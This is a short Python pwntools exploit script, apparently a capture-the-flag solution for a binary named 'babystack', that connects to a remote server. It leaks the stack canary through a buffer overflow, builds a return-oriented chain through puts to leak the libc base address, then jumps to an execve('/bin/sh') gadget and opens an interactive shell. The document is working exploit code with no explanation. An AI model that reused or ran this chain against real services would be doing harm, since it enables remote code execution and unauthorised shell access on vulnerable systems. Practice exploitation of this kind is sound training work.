from pwn import *
#p = process('./babystack')
p = remote('111.200.241.244', 56733)
elf = ELF('./babystack')
libc = ELF('./libc-2.23.so')
context.log_level = 'debug'
main = 0x0000000000400908
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

def choice(a):
	p.recvuntil('>> ')
	p.sendline(str(a))

execve = 0x45216  # execve("/bin/sh", rsp+0x30, environ)
pop_rdi = 0x0000000000400a93 # pop rdi ; ret

choice(1)
pay = 'a'*0x88
p.sendline(pay)
choice(2)
p.recv(0x89)
canary =  '\x00' +  p.recv(7)
print hex(u64(canary))
#raw_input()
pay = 'a'*0x88 + canary + 'a'*0x8  + p64(pop_rdi) + p64(puts_got)
pay += p64(puts_plt) + p64(main)
choice(1)
p.send(pay)
choice(3)

puts_addr = u64(p.recv(6) + '\x00\x00')
puts_libc = libc.sym['puts']
base = puts_addr - puts_libc
print 'base=' + str(hex(base))

choice(1)
pay = 'a'*0x88 + canary + 'a'*0x8 + p64(base + execve)
p.send(pay)

choice(3)

p.interactive()
